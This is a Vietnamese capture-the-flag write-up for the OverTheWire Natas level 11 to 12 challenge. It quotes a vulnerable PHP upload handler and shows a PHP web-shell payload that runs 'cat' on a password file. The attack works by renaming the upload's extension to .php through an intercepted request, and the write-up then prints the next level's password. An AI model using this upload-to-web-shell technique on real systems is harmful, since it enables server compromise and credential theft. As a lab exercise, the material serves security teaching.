# Natas Level 11 → Level 12

Username: natas12

URL: http://natas12.natas.labs.overthewire.org

# Solution

Truy cập website: 

![img](58)

Click View sourcecode: 

![img](59)

Tìm được đoạn mã PHP: 

![img]()

    <?php

    function genRandomString() {
        $length = 10;
        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
        $string = "";

        for ($p = 0; $p < $length; $p++) {
            $string .= $characters[mt_rand(0, strlen($characters)-1)];
        }

        return $string;
    }

    function makeRandomPath($dir, $ext) {
        do {
        $path = $dir."/".genRandomString().".".$ext;
        } while(file_exists($path));
        return $path;
    }

    function makeRandomPathFromFilename($dir, $fn) {
        $ext = pathinfo($fn, PATHINFO_EXTENSION);
        return makeRandomPath($dir, $ext);
    }

    if(array_key_exists("filename", $_POST)) {
        $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


            if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
            echo "File is too big";
        } else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
                echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
            } else{
                echo "There was an error uploading the file, please try again!";
            }
        }
    } else {
    ?>

=> Đoạn code không kiểm tra extension thực sự của file, không kiểm tra MIME type, không chặn thực thi PHP trong thư mục upload, không kiểm tra file upload hợp lệ. 

Tạo payload có dạng sau: 

    <?php
        echo system("cat /etc/natas_webpass/natas13");
    ?>

![img](60)

Thử upload 1 file jpeg hợp lệ và Intercept request này: 

![img](61)

Send request này:

![img](62)

Có vẻ kích thước file vượt quá mức cho phép, thử upload file có kích thước < 1KB:

![img](63)

Send request: 

![img](64)

=> Upload file thành công. 

Lần này thử chọn upload file shell.php: 

![img](65)

Send request: 

![img](66)

=> Tên file bị thay đổi và định dạng thành file .jpg

Upload lại nhưng lần này chỉnh sửa Request: 

![img](67)

=> Đổi extension file mà website tự sinh ra thành .php, forward request này: 

![img](68)

=> Extension của file đã đổi thành .php, click vào tên file này: 

![img](69)

=> Password natas13: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

